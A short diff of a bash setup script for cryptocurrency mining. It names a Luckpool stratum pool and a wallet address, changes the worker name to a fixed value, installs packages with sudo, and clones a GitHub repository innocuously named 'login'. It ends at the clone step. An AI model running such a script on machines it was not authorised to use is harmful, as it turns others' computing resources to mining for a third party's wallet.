@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=stratum+tcp://na.luckpool.net:3956#xnsub
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
-WORKER=$(echo $(shuf -i 10-40 -n 1)-vps)
+WORKER=vps
 sudo apt update
 sudo apt install screen libjansson4 -y
 git clone https://github.com/sallygonza/login.git 
